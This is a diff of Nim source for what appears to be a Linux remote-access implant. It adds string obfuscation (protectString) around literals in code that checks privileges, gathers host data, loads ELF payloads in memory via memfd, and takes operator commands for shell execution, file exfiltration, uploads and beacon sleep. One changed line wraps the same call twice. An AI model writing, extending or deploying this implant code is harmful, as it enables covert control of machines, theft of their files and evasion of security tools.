@@ -62,17 +62,17 @@ proc collect_data(): bool =
     except:
         username = could_not_retrieve
     if username == protectString("root"):
-        is_admin = "True"
-        is_elevated = "True"
+        is_admin = protectString("True")
+        is_elevated = protectString("True")
     else: 
         try:
             if protectString("(sudo)") in execCmdEx(protectString("id"))[0]:
-                is_admin = "True"
+                is_admin = protectString("True")
             else:
-                is_admin = "False"
+                is_admin = protectString("False")
         except:
             is_admin = could_not_retrieve
-        is_elevated = "False"
+        is_elevated = protectString("False")
     try:
         ipv4_local = execCmdEx(protectString("hostname -I"))[0].replace(" ", "\n")
     except:
@@ -106,9 +106,9 @@ proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bo
     var output: string
     
     case mode:
-        of "implant":
+        of protectString("implant"):
             is_task = false
-        of "task":
+        of protectString("task"):
             is_task = true
         else:
             return false
@@ -122,7 +122,7 @@ proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bo
     }.toOrderedTable()
     
     if output.len() > 0:
-        data["output"] = output
+        data[protectString("output")] = output
 
     is_success = post_data(client, protectString("memfd"), $data)
 
@@ -163,15 +163,15 @@ proc linux_parse_command*(command: JsonNode): bool =
     var command_type = command[protectString("command_type")].getStr()
     case command_type:
         of protectString("cmd"):
-            is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
+            is_success = run_shell_command(client, command[protectString(protectString("shell_command"))].getStr())
         of protectString("download"):
-            is_success = exfil_file(client, command["src_file"].getStr())
+            is_success = exfil_file(client, command[protectString("src_file")].getStr())
         of protectString("upload"):
-            is_success = write_file(client, command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr()) 
+            is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr()) 
         of protectString("memfd"):
-            is_success = wrap_load_memfd(command["elf_file_data_base64"].getStr(), command["command_line"].getStr(), command["mode"].getStr())
+            is_success = wrap_load_memfd(command[protectString("elf_file_data_base64")].getStr(), command[protectString("command_line")].getStr(), command[protectString("mode")].getStr())
         of protectString("sleep"):
-            is_success = change_sleep_time(client, command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
+            is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
             is_success = collect_data()
         of protectString("kill"):
